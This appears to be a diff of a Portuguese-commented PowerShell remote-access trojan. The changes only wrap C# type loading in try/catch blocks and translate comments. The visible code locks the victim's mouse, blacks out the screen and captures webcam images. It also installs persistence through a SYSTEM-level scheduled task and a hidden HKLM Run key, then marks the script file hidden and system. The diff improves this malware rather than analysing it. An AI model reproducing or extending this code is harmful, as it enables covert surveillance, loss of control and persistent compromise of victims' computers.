@@ -395,7 +395,7 @@ function Hide-BlackScreen {
     }
 }
 
-# ===== TRAVAR MOUSE (CÓDIGO C# CORRIGIDO) =====
+# ===== TRAVAR MOUSE =====
 $global:mouseLocked = $false
 $global:lockThread = $null
 
@@ -405,7 +405,6 @@ function Lock-Mouse {
         
         $global:mouseLocked = $true
         
-        # Primeiro, adiciona o tipo MouseLocker separadamente
         $mouseLockerCode = @'
 using System;
 using System.Runtime.InteropServices;
@@ -447,7 +446,11 @@ public class MouseLocker
 }
 '@
         
-        Add-Type -TypeDefinition $mouseLockerCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
+        try {
+            Add-Type -TypeDefinition $mouseLockerCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
+        } catch {
+            # Tipo já existe, continuar
+        }
         
         $global:lockThread = [System.Threading.Thread]::new({
             try {
@@ -457,7 +460,7 @@ public class MouseLocker
                     Start-Sleep -Milliseconds 10
                 }
             } catch {
-                # Silently continue
+                # Silenciosamente ignorar erros
             }
         })
         
@@ -478,11 +481,10 @@ function Unlock-Mouse {
             $global:lockThread.Abort()
         }
         
-        # Tenta chamar Unlock se o tipo existir
         try {
             [MouseLocker]::Unlock()
         } catch {
-            # Ignora se não existir
+            # Ignorar se não existir
         }
         
         return "MOUSE_UNLOCKED"
@@ -572,7 +574,11 @@ public class WebcamCapture
 }
 '@
         
-        Add-Type -TypeDefinition $webcamCode -ReferencedAssemblies "System.Drawing.dll", "System.Windows.Forms.dll" -ErrorAction Stop
+        try {
+            Add-Type -TypeDefinition $webcamCode -ReferencedAssemblies "System.Drawing.dll", "System.Windows.Forms.dll" -ErrorAction Stop
+        } catch {
+            # Tipo já existe, continuar
+        }
         
         $frame = [WebcamCapture]::Capture()
         if ($frame) {
@@ -632,14 +638,14 @@ function Install-Persistence {
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
     } catch {
-        # Silently continue
+        # Silenciosamente ignorar erros
     }
     
     try {
         $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
     } catch {
-        # Silently continue
+        # Silenciosamente ignorar erros
     }
     
     attrib +h +s +r $scriptPath
